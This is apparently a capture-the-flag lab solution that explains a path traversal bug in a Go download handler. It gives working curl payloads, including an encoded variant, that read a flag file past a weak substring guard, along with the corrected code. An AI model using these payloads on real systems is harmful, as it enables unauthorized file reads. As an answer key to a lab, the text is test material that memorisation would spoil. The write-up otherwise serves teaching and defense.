# w17 Concat Walk :: solution

## Root cause

`app/main.go`, `handleDownload()`:

```go
name := r.URL.Query().Get("f")

// The guard. Catches "a/../b", misses "../b".
if strings.Contains(name, "/../") {
    writeJSON(w, http.StatusForbidden, map[string]string{"error": "traversal blocked"})
    return
}

// Concatenation, not filepath.Join. That difference is the bug.
target := root + "/" + name

f, err := os.Open(filepath.Clean(target))
```

Two independent mistakes stack:

1. **String concatenation instead of `filepath.Join`.** `filepath.Join(root, name)`
   calls `Clean` and collapses `..` segments. `root + "/" + name` does not. The
   `filepath.Clean` on the next line is a red herring — it normalises the
   *resulting* string, which by then already contains the traversal, so it
   happily produces `/srv/private/flag.txt`.

2. **A substring guard that models the wrong shape.** `strings.Contains(name, "/../")`
   requires a slash *before* the two dots. The traversal that matters,
   `../private/flag.txt`, starts with the dots and has no preceding segment, so
   the guard never fires.

Together: the guard rejects the textbook form, the concatenation permits every
form, and reading `/srv/private/flag.txt` is a one-liner.

## Exploit

Confirm the drop serves normally first:

```bash
curl 'http://localhost:30017/dl?f=manifest.txt'
# CONCAT WALK :: public drop
```

Now probe the guard's blind spot. The guarded shape is correctly refused:

```bash
curl -s --path-as-is 'http://localhost:30017/dl?f=a/../private/flag.txt'
# {"error":"traversal blocked"}
```

The leading form is not:

```bash
curl -s --path-as-is 'http://localhost:30017/dl?f=../private/flag.txt'
# hex4b0t{verifytest123456}
```

Equivalent payload, in case a client or proxy mangles the slashes:

```bash
# slash percent-encoded - still a leading traversal, still passes the guard
curl -s --path-as-is 'http://localhost:30017/dl?f=..%2fprivate%2fflag.txt'
```

Note that `x/../../private/flag.txt` does **not** work — it contains the literal
substring `/../`, so the guard catches it. The payload must have *no* segment
before the dots; that is the whole trick.

`--path-as-is` matters here: `curl` otherwise normalises `..` out of the *URL*
before sending, which removes the payload entirely. If you use Burp or a raw
socket you do not need the flag.

### Why `a/../private/flag.txt` is blocked but `../private/flag.txt` is not

Run the two through the guard's logic:

| input | contains `"/../"`? | outcome |
|---|---|---|
| `a/../private/flag.txt` | yes | 403 |
| `../private/flag.txt` | **no** | 200 + flag |
| `..%2fprivate%2fflag.txt` | no | 200 + flag |

The payload needs no segment before the dots. Once you see that, the guard reads
as obviously incomplete — it was written against the shape people picture, not
the shape that actually escapes a root.

### The fix

```go
// Clean, then verify the result is still inside the root.
target := filepath.Join(root, name)
if !strings.HasPrefix(target, root+string(os.PathSeparator)) {
    http.Error(w, "forbidden", http.StatusForbidden)
    return
}
```

`filepath.Join` cleans, and the prefix check catches anything that still escapes
(including symlinks pointing out of the tree, which the join alone would allow).

## Notes on the original design

This lab was prototyped as an nginx `alias` off-by-one traversal
(`location /media { alias /srv/media; }` with no trailing slash). That class is
**closed on current nginx**: 1.31.5 rejects every `..` variant with 400 or 404,
including the percent-encoded forms, so the lab would not have been solvable.
Rather than pin an ancient base image, the mechanism moved to an application
level bug — which is both version-independent and the more realistic mistake.

## Flag

Injected at runtime via `W0B_FLAG` and written to `/srv/private/flag.txt` by
`docker/10-seed.sh` at container start. There is no static value to hardcode.

## Submit

```bash
./manage.sh submit 'hex4b0t{...}' ai-pilot
```
